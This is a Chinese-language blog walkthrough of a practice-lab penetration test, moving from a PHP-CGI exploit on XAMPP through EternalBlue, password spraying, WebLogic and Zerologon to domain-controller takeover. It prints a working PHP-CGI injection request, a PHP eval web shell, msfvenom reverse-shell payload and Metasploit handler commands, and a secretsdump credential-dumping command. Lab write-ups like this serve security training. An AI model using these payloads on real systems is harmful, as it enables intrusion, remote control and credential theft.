#  PHPRCE-永恒之蓝-防火墙上线-密码喷射-DC域控提权-weblogic   
 网络安全者   2025-05-16 01:25  
  
## 引言  
  
近期利用闲暇时间，我对小迪老师提供的靶场环境进行了全面的渗透测试实战演练。本次记录旨在详细还原整个渗透过程，包括环境搭建、信息收集、漏洞利用、权限提升及内网横向移动等关键环节，以期巩固所学知识并提升实战技能。  
  
![1747053610_6821ec2ab177eca5ea6c6.png!small?1747053611173](https://mmbiz.qpic.cn/mmbiz_jpg/iar31WKQlTTrDRttibW9XfWUd7Nia3q8oOXa6NZgEqH5HRpj6W9GCLs76yN22VnBc7tOaErWT93N7V424za0AJcdg/640?wx_fmt=jpeg&from=appmsg "")  
## 环境搭建  
### 项目下载：  
  
链接: https://pan.baidu.com/s/1JrCRqsF_mVTB6gh6VkdTng提取码: ga54  
  
![1747053657_6821ec59ef27f0038bab5.png!small?1747053657652](https://mmbiz.qpic.cn/mmbiz_jpg/iar31WKQlTTrDRttibW9XfWUd7Nia3q8oOX9srwOiciaHMLnJibrdtLLlEZ3ibfibfB7gYIPwIfb7ktO1PP7hiciamsfLFtA/640?wx_fmt=jpeg&from=appmsg "")  
### 配置网卡：  
  
![1747053672_6821ec685305373a44731.png!small?1747053672020](https://mmbiz.qpic.cn/mmbiz_jpg/iar31WKQlTTrDRttibW9XfWUd7Nia3q8oOX0kWf72gicibHqM1SHuPrUZoX1ObGX6iaD2lKKzHJZtDDPYicPll5UAaF0A/640?wx_fmt=jpeg&from=appmsg "")  
  
vmware8/NAT 对应192.168.139.0网段  
  
vmware2对应192.168.2.0网段  
  
vmware3对应192.168.3.0网段  
  
vmware10对应192.168.10.0网段  
  
**Windows Server 2012**  
  
![1747053689_6821ec79cab39a92ffba4.png!small?1747053689961](https://mmbiz.qpic.cn/mmbiz_jpg/iar31WKQlTTrDRttibW9XfWUd7Nia3q8oOXUE9kgagj8WGmibQ5ozjXy48lA7z6VP5Tbx1z1jXq7rNxJwB1MXYibVicQ/640?wx_fmt=jpeg&from=appmsg "")  
  
登陆进去打开xampp服务  
  
![1747053703_6821ec8751fc13d345b1b.png!small?1747053703115](https://mmbiz.qpic.cn/mmbiz_jpg/iar31WKQlTTrDRttibW9XfWUd7Nia3q8oOXcziazOrIEINSVUJh0CyDe2Iyg81tHwefqChfq3iaMWGibUPWyntevlsiaw/640?wx_fmt=jpeg&from=appmsg "")  
  
**Windows 7**  
  
![1747053718_6821ec96d228b8dbc5c46.png!small?1747053718851](https://mmbiz.qpic.cn/mmbiz_jpg/iar31WKQlTTrDRttibW9XfWUd7Nia3q8oOXZlz7rm3Cd6icnRlC6Dt3eibZNmVPW9x5AVRqxoH9NhFDY8YpWSmQSCFw/640?wx_fmt=jpeg&from=appmsg "")  
  
**Windows 10**  
  
![1747053732_6821eca411a374c9ddc6d.png!small?1747053732201](https://mmbiz.qpic.cn/mmbiz_jpg/iar31WKQlTTrDRttibW9XfWUd7Nia3q8oOXbMCz3b34PXtPsb6tY3N4Df0kBPTgEicGHqAoeaHKjIyiaKE5VDRWfcrg/640?wx_fmt=jpeg&from=appmsg "")  
  
**Windows Server 2012 R2（weblogic 单机）**  
  
![1747053756_6821ecbcb0f8e2d9422fa.png!small?1747053756760](https://mmbiz.qpic.cn/mmbiz_jpg/iar31WKQlTTrDRttibW9XfWUd7Nia3q8oOXdX4dl4icQkKdn0hq5aSjQsBeRJCIxG7Lyxeib1y6kibsibHAibtDu8UNYOw/640?wx_fmt=jpeg&from=appmsg "")  
  
**Windows Server 2012-WEB**  
  
![1747053772_6821eccc9d541e944ea61.png!small?1747053772632](https://mmbiz.qpic.cn/mmbiz_jpg/iar31WKQlTTrDRttibW9XfWUd7Nia3q8oOXx7NEwZXtYniaREzZhbhl7Rb4xU0ibgJGicrHanGzkGAeFK41uhJPevbjg/640?wx_fmt=jpeg&from=appmsg "")  
  
**Windows Server 2016-AD-2016**  
  
![1747053790_6821ecde222d78479e1f4.png!small?1747053789967](https://mmbiz.qpic.cn/mmbiz_jpg/iar31WKQlTTrDRttibW9XfWUd7Nia3q8oOXFUZhdWicH1gTZaZia17j5u5ians0FoRpibJqWfhF4uNs9Zv5GSCA24546Q/640?wx_fmt=jpeg&from=appmsg "")  
## 打靶  
### windows server 2012  
### 信息收集  
  
![1747053809_6821ecf16c257bbc3c9a9.png!small?1747053809254](https://mmbiz.qpic.cn/mmbiz_jpg/iar31WKQlTTrDRttibW9XfWUd7Nia3q8oOXpt5X7FaiconuwsDeEbiaKQzUukBZE6LqBuKG6mdjRSyJQl37a9UtkCCg/640?wx_fmt=jpeg&from=appmsg "")  
### XAMPP 渗透拿shell  
  
打开网站80端口  
  
![1747053833_6821ed09c2d9b2f19ad6f.png!small?1747053833764](https://mmbiz.qpic.cn/mmbiz_jpg/iar31WKQlTTrDRttibW9XfWUd7Nia3q8oOXAdgsMS7COnXhMJxsah6mibAic3ZVpOwL1IwZwsCaq1hwd9PJ9mfFo4pw/640?wx_fmt=jpeg&from=appmsg "")  
![1747053843_6821ed133ade163743e16.png!small?1747053843715](https://mmbiz.qpic.cn/mmbiz_jpg/iar31WKQlTTrDRttibW9XfWUd7Nia3q8oOXsZTIqRVu39Y3DoG4l9c9qPvg97QzGK2IUicyqKkbGicxTwia5e8WfK7iag/640?wx_fmt=jpeg&from=appmsg "")  
  
[https://mp.weixin.qq.com/s/93TuxZ4AVqHXcnJw3M4hRg](https://mp.weixin.qq.com/s?__biz=MzkwMzMwODg2Mw==&mid=2247507195&idx=1&sn=74e9d776778045fb21fbb2d39b18c6d8&scene=21#wechat_redirect)  
  
```
```  
  
```
ounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(line
POST /php-cgi/php-cgi.exe?%add+cgi.force_redirect%3dXCANWIN+%add+allow_url_include%3don+%add+auto_prepend_file%3dphp%3a//input HTTP/1.1
Host: 192.168.139.128
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Priority: u=0, i
Content-Type: application/x-www-form-urlencoded
Content-Length: 23
<?php die("Te"."sT");?>

```  
  
  
发现可以成功执行命令，但是想要反弹shell没有办法只用get,所以我们得尝试写入文件  
  
查看phpinfo，发现当我们写入文件应该会放在\php\下  
  
![1747053873_6821ed3119dc55c849896.png!small?1747053873212](https://mmbiz.qpic.cn/mmbiz_jpg/iar31WKQlTTrDRttibW9XfWUd7Nia3q8oOXQY42rymwic7QHqShH9aeNTZfZjGzhEiazoBIM8tXBRspLfhqsrjPyMCg/640?wx_fmt=jpeg&from=appmsg "")  
  
而经过chatgpt的搜索，可以知道网站的路径在/htdocs/下，所有我们得把文件上传到这  
  
![1747053884_6821ed3c81fd4414c20de.png!small?1747053885236](https://mmbiz.qpic.cn/mmbiz_jpg/iar31WKQlTTrDRttibW9XfWUd7Nia3q8oOXVkP9Q3XX9IIzm95Ddiaxef1I2jANquJskAE3ccyENaa9a47JxkWtYGQ/640?wx_fmt=jpeg&from=appmsg "")  
  
<?php  
  
file_put_contents("../htdocs/1.php", " <?php @eval($_POST['attack']);?>  
  
"); ?>成功写入，然后将其改为后门的木马  
  
![1747053896_6821ed48a2b40830cb628.png!small?1747053897214](https://mmbiz.qpic.cn/mmbiz_jpg/iar31WKQlTTrDRttibW9XfWUd7Nia3q8oOXhy8gHIU1ibMYjc1iaibA4DZTiaCGR4sgOd7IGH0JFssTIdDnL21pUAdoJQ/640?wx_fmt=jpeg&from=appmsg "")  
  
成功写入连接  
  
![1747053908_6821ed5475819d3b554a7.png!small?1747053910627](https://mmbiz.qpic.cn/mmbiz_jpg/iar31WKQlTTrDRttibW9XfWUd7Nia3q8oOXU88ibTMwFFmSLeicqNf99e4wapkIWDSzy6SsOOjwwVCpVbsiabXfEicsmg/640?wx_fmt=jpeg&from=appmsg "")  
  
将其连接到cs(生成后门上传执行）  
  
![1747053920_6821ed60ad830a714eaef.png!small?1747053921083](https://mmbiz.qpic.cn/mmbiz_jpg/iar31WKQlTTrDRttibW9XfWUd7Nia3q8oOXFLzjUkNcU5e06Atlwf5tIibocym1UJSx0IQ3NEjjBIn5fGXbmiarPUWg/640?wx_fmt=jpeg&from=appmsg "")  
### windows7  
### 信息收集  
  
![1747053943_6821ed778c7fe2a547427.png!small?1747053943415](https://mmbiz.qpic.cn/mmbiz_jpg/iar31WKQlTTrDRttibW9XfWUd7Nia3q8oOXficynyGibvy1HuqyT8XiaEUIzhbNeZssAmaUPniacG3h62MmlO5SCn8Jhw/640?wx_fmt=jpeg&from=appmsg "")  
  
端口扫描和探测  
  
并且抓取明文的密码  
  
![1747053952_6821ed8096000dd4e1e26.png!small?1747053952322](https://mmbiz.qpic.cn/mmbiz_jpg/iar31WKQlTTrDRttibW9XfWUd7Nia3q8oOX9GNUZibCzCicSD3EI3BgKQZtpazIhaT6sNeohD8LlrXqVH99Jtv1r3pQ/640?wx_fmt=jpeg&from=appmsg "")  
  
![1747053958_6821ed86c2afee9bdbd74.png!small?1747053958452](https://mmbiz.qpic.cn/mmbiz_jpg/iar31WKQlTTrDRttibW9XfWUd7Nia3q8oOX1dLVJmoTNuXg9uhWU6rtYNIUHDnH9ITkLum8bkias2cPntFqD2hwlrg/640?wx_fmt=jpeg&from=appmsg "")  
  
发现129只有445端口  
  
将fscan传上去  
  
运行，发现![1747053972_6821ed9429b329afd7dbb.png!small?1747053971846](https://mmbiz.qpic.cn/mmbiz_jpg/iar31WKQlTTrDRttibW9XfWUd7Nia3q8oOXNQ9DvwicB2AyfwfBqy4pJOcGTRGDDdmQHFDz6KicqJmmXic1NW78do9Lw/640?wx_fmt=jpeg&from=appmsg "")  
  
  
存在永恒之蓝  
### 永恒之蓝漏洞  
  
先将其转到msf上![1747054069_6821edf52eb331a923220.png!small](https://mmbiz.qpic.cn/mmbiz_jpg/iar31WKQlTTrDRttibW9XfWUd7Nia3q8oOXWLjib88aDYe5LjfvSO07T2eVHPZgryoZaQU4gCk6KuaBntibKeicpXNTw/640?wx_fmt=jpeg&from=appmsg "")  
  
  
  
![1747054083_6821ee03bf1fd7ff66914.png!small?1747054083848](https://mmbiz.qpic.cn/mmbiz_jpg/iar31WKQlTTrDRttibW9XfWUd7Nia3q8oOXeZsHGribaxrJF0FYIYEoKGBdzjtIPnv0HibGVdmIobOTnibpX8KBVY5DA/640?wx_fmt=jpeg&from=appmsg "")  
  
![1747054090_6821ee0ad16e759c7f671.png!small?1747054090544](https://mmbiz.qpic.cn/mmbiz_jpg/iar31WKQlTTrDRttibW9XfWUd7Nia3q8oOXf4SWlvYyRbERxDGb45D7TfDSqrL5KqzhMKibbUQZ47Sz7eGh8xtEzvQ/640?wx_fmt=jpeg&from=appmsg "")  
  
或者直接用哥斯拉的传  
  
![1747054106_6821ee1a793498a9be2a3.png!small?1747054106238](https://mmbiz.qpic.cn/mmbiz_jpg/iar31WKQlTTrDRttibW9XfWUd7Nia3q8oOX9ofkXCTeh1nS4AGkGjSlnC2r1HM6pxXfSnXHjcbT3emHpRWETFiabjw/640?wx_fmt=jpeg&from=appmsg "")  
  
或者直接生成msf的后门  
> msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.139.129 LPORT=5210 -f exe -o 5210.exe  
>   
> use exploit/multi/handler  
> set payload windows/meterpreter/reverse_tcp  
> set lhost 192.168.2.129  
> set lport 1234  
> run  
  
  
  
建立路由  
  
<font style="color:rgb(51, 51, 51);">run autoroute -p //查看当前路由表</font>  
  
<font style="color:rgb(51, 51, 51);">run post/multi/manage/autoroute //添加当前路由表</font>  
  
  
注意：因为这是内网网段的机器，所以我们只是单纯的区执行这个永恒之蓝漏洞是完全不行的，我们得先设置监听器，到 第一台的主机  
  
  
use exploit/multi/handler  
  
<font style="color:rgb(51, 51, 51);">set payload windows/x64/meterpreter/reverse_tcp </font>  
  
set lhost 192.168.2.134  
  
set lport 4548  
  
![1747054179_6821ee631fa060103552d.png!small?1747054180633](https://mmbiz.qpic.cn/mmbiz_jpg/iar31WKQlTTrDRttibW9XfWUd7Nia3q8oOXxJkMlILorsm1eYPLL5nRiakwST0l4QKe4pomVpEnQ9aEttkfNrsqPFA/640?wx_fmt=jpeg&from=appmsg "")  
  
<font style="color:rgb(51, 51, 51);">use exploit/windows/smb/ms17_010_eternalblue</font>  
  
<font style="color:rgb(51, 51, 51);">set payload windows/x64/meterpreter/reverse_tcp </font>  
  
set rhost 192.168.2.129  
  
set rhosts 192.168.2.129  
  
set lhost 192.138.2.134  
  
set lport 4548  
  
上传后门，然后再转发上线  
  
成功上线  
### Windows10  
  
### 密码喷射  
  
再administrator  
  
![1747054216_6821ee88540791d035f0b.png!small?1747054217329](https://mmbiz.qpic.cn/mmbiz_jpg/iar31WKQlTTrDRttibW9XfWUd7Nia3q8oOXna56jbnpD9G2rAoYBazYBlxluxO6EepzfmjWic348EKDX2N8Nr2BsDw/640?wx_fmt=jpeg&from=appmsg "")  
  
![1747054223_6821ee8fe3406b58f2904.png!small?1747054223767](https://mmbiz.qpic.cn/mmbiz_jpg/iar31WKQlTTrDRttibW9XfWUd7Nia3q8oOXhAicp3CM12KHib3LhkJNibVgHFXeqYichteektRibQcibJDkYVQbkbUcianqA/640?wx_fmt=jpeg&from=appmsg "")  
  
密码横向移动![1747054235_6821ee9bd245202dd5bbb.png!small?1747054236714](https://mmbiz.qpic.cn/mmbiz_jpg/iar31WKQlTTrDRttibW9XfWUd7Nia3q8oOX1CicBJ7pg6FQ26qBlicGopa19k33IOvXltic1McZviagjwTdTDH5GSZ7gA/640?wx_fmt=jpeg&from=appmsg "")  
  
### windows server R2  
  
![1747054249_6821eea9b1e0a94cdaf6a.png!small?1747054249763](https://mmbiz.qpic.cn/mmbiz_jpg/iar31WKQlTTrDRttibW9XfWUd7Nia3q8oOXV4ZPDsS2YlcWYnQMhM8CMZXA4zejgMl8zAEbTTEpH8MCxf33XibbXRg/640?wx_fmt=jpeg&from=appmsg "")  
  
发现7001端口，是weblogic，所以建立代理，访问  
  
![1747054264_6821eeb8b090cdfe4ca72.png!small?1747054264745](https://mmbiz.qpic.cn/mmbiz_jpg/iar31WKQlTTrDRttibW9XfWUd7Nia3q8oOXaaMVMtbQP5UF6WwZWAXMITFibtj8ZZAWCtt8sIuticvOnLcNLKLE42sw/640?wx_fmt=jpeg&from=appmsg "")  
![1747054274_6821eec2725be3b93b064.png!small?1747054274494](https://mmbiz.qpic.cn/mmbiz_jpg/iar31WKQlTTrDRttibW9XfWUd7Nia3q8oOX3DwvSibx1Dx7qVOSVKoXCf5icUXJQrHWMkCEEQjRPHhcDrk9VhVCTr5g/640?wx_fmt=jpeg&from=appmsg "")  
### windows server 2012  
  
![1747054295_6821eed7a942669cfcb09.png!small?1747054295603](https://mmbiz.qpic.cn/mmbiz_jpg/iar31WKQlTTrDRttibW9XfWUd7Nia3q8oOXnia0gvKwPUjaj0ic2FVKA3NUCd7qGfozibPv07o3VQkzicF2xHM5jRTyHA/640?wx_fmt=jpeg&from=appmsg "")  
  
集成攻击一把梭  
  
![1747054305_6821eee193964e667826e.png!small?1747054305585](https://mmbiz.qpic.cn/mmbiz_jpg/iar31WKQlTTrDRttibW9XfWUd7Nia3q8oOXqamZRH1wrIzmtp8ASFGNSWMlbvxMpB6YAEcXyDJ33d7iblUNPn9UJfg/640?wx_fmt=jpeg&from=appmsg "")  
  
植入内存马  
  
![1747054321_6821eef1a6a8a8f46fc23.png!small?1747054321366](https://mmbiz.qpic.cn/mmbiz_jpg/iar31WKQlTTrDRttibW9XfWUd7Nia3q8oOXN5eMYb3cbl20q9iap9FuaIH1Sowv4T4g3zOicDwEXrjqChn4hTL5c4zg/640?wx_fmt=jpeg&from=appmsg "")  
  
上线cs  
  
windows server 2012 web  
  
抓取密码，发现密码  
  
![1747054336_6821ef00a3d8d831ca2a6.png!small?1747054336314](https://mmbiz.qpic.cn/mmbiz_jpg/iar31WKQlTTrDRttibW9XfWUd7Nia3q8oOXoSye4toZsk79swR6rCmX6CWMWsVNcF0e7Lmic9oiaC3UoMAYVibE07S1Q/640?wx_fmt=jpeg&from=appmsg "")  
![1747054396_6821ef3c9312503b78ade.png!small?1747054396322](https://mmbiz.qpic.cn/mmbiz_jpg/iar31WKQlTTrDRttibW9XfWUd7Nia3q8oOXcYibOaf7MgyZLxEyTibqWCWExGwLZR0hJ9ibnU4IpTIaKSmFiaD7pR4jtA/640?wx_fmt=jpeg&from=appmsg "")  
  
尝试用密码横向移动，但是自身有防火墙，所以没办法使用反向上线，需要通过正向上线![1747054405_6821ef456d9d02f3316a4.png!small?1747054405208](https://mmbiz.qpic.cn/mmbiz_jpg/iar31WKQlTTrDRttibW9XfWUd7Nia3q8oOX3HFg4zhoyAEcTiamTLMqicmEv0SWjsxDrwr45zEtBB8pg8EdcA5NcFzA/640?wx_fmt=jpeg&from=appmsg "")  
![1747054412_6821ef4c597b5b98b6f1c.png!small?1747054412075](https://mmbiz.qpic.cn/mmbiz_jpg/iar31WKQlTTrDRttibW9XfWUd7Nia3q8oOX4ZgvkPADcwoL4HEP7TRL3tKmdNaUbDCCiaglLiaCApxYU6R0cbmSrpqg/640?wx_fmt=jpeg&from=appmsg "")  
  
  
不知道为什么我的这样子无法上线  
  
先用ipc协议将文件共享![1747054423_6821ef57f3cdf9af26286.png!small?1747054423771](https://mmbiz.qpic.cn/mmbiz_jpg/iar31WKQlTTrDRttibW9XfWUd7Nia3q8oOXOynOEljHfQmya9efmNkbo2ibibjtAlPw6Kdj2AKHndzblJJ82lFAQ4Ew/640?wx_fmt=jpeg&from=appmsg "")  
  
  
然后使用atexec来执行  
  
![1747054442_6821ef6aab0a502f416ea.png!small?1747054442592](https://mmbiz.qpic.cn/mmbiz_jpg/iar31WKQlTTrDRttibW9XfWUd7Nia3q8oOX6BZdL3obgAaSSJMvh6giadhRW38kTibh40NJXPzbad70R0BQ0dop9kBQ/640?wx_fmt=jpeg&from=appmsg "")  
  
成功上线  
### DC  
  
net time /domain发现是在域内![1747054460_6821ef7ceadbe9e24d7b2.png!small?1747054460789](https://mmbiz.qpic.cn/mmbiz_jpg/iar31WKQlTTrDRttibW9XfWUd7Nia3q8oOXKo9cLc59ibt6pEica9gzVIyL4E2o5KnyTy3XFXAAfibT1AmxRxuUVRGZg/640?wx_fmt=jpeg&from=appmsg "")  
  
  
先建立代理  
  
改host文件为dc  
  
![1747054472_6821ef8885abb961f0892.png!small?1747054472641](https://mmbiz.qpic.cn/mmbiz_jpg/iar31WKQlTTrDRttibW9XfWUd7Nia3q8oOX9P8QKdT28JiaGyQiamvO0iblZKsT4degWvnRlYZ1kbwfxUHhkwPsn9rLw/640?wx_fmt=jpeg&from=appmsg "")  
### cve 2020 1472 域控提权  
  
![1747054485_6821ef952c9696e296624.png!small?1747054484904](https://mmbiz.qpic.cn/mmbiz_jpg/iar31WKQlTTrDRttibW9XfWUd7Nia3q8oOXbCNORoILbZ0EX2oezklCz84IIHEV3Uf4C5bWyvWfbYxk6KHma8NdRg/640?wx_fmt=jpeg&from=appmsg "")  
  
清空密码  
  
（在impacket里面）  
  
python secretsdump.py "xiaodi.org/dc$@192.168.10.10" -no-pass  
  
![1747054497_6821efa176812cfb0796b.png!small?1747054497635](https://mmbiz.qpic.cn/mmbiz_jpg/iar31WKQlTTrDRttibW9XfWUd7Nia3q8oOX0lxQaJMrhUANER7kM5xCb8k2U9B7r5GCv2kSDXaJK8u9JIvLBg28lg/640?wx_fmt=jpeg&from=appmsg "")  
  
一般都是第一个administrator的第一个或者第二个![1747054512_6821efb0a161527e060e8.png!small?1747054512627](https://mmbiz.qpic.cn/mmbiz_jpg/iar31WKQlTTrDRttibW9XfWUd7Nia3q8oOXNBoumHCzaM0emOfEolxfjOmZx7SRB8jibeCjBOFiaTqcCia5z8Oc7Oxgg/640?wx_fmt=jpeg&from=appmsg "")  
  
  
（域控是dc.xiaodi.org ,)  
  
成功得到shell,然后将其上线cs![1747054524_6821efbc067d5bf4a25a5.png!small?1747054523784](https://mmbiz.qpic.cn/mmbiz_jpg/iar31WKQlTTrDRttibW9XfWUd7Nia3q8oOXNB40Na97pkVAaxdYJTNTNibqs2ucNpRpcV1NPw09ibgDjst5HETzD9ZA/640?wx_fmt=jpeg&from=appmsg "")  
  
  
成功上线![1747054532_6821efc4c687158b44847.png!small?1747054532602](https://mmbiz.qpic.cn/mmbiz_jpg/iar31WKQlTTrDRttibW9XfWUd7Nia3q8oOXGfCict5QCCNoyeYw5icOuo9fqdpAEQ1MVoiaTWo72IU4tGiccwfhhToyXA/640?wx_fmt=jpeg&from=appmsg "")  
  
  
至此完成所有的机子的上线  
## 总结  
  
本次小迪老师靶场实战演练，从环境搭建到对域控制器的完全控制，覆盖了Web渗透、内网横向移动、权限提升等多个核心环节。在实践过程中，不仅巩固了PHP-CGI、永恒之蓝、WebLogic等常见漏洞的利用方法，也深入理解了内网渗透中路由建立、代理配置、文件传输及正向上线等关键技巧。同时，对在实战中遇到的问题（如永恒之蓝利用失败、正向上线受阻）进行了分析，并尝试了不同的解决思路。  
  
通过此次靶场实战，进一步提升了个人在网络安全领域的综合实战能力和问题解决能力。  
  
  
**关 注 有 礼**  
  
  
  
欢迎关注公众号：网络安全者  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/0JJXjA8siccxdOvXt6Ez07aIM7LibibYn72xDdQRRmiaHEcwp9ITScZkVHpjKib6iasJ79bHLHFUDJuPrDjiasCrWcORQ/640?wx_fmt=jpeg&from=appmsg "")  
  
  
  
本文内容来自网络，如有侵权请联系删除  
  
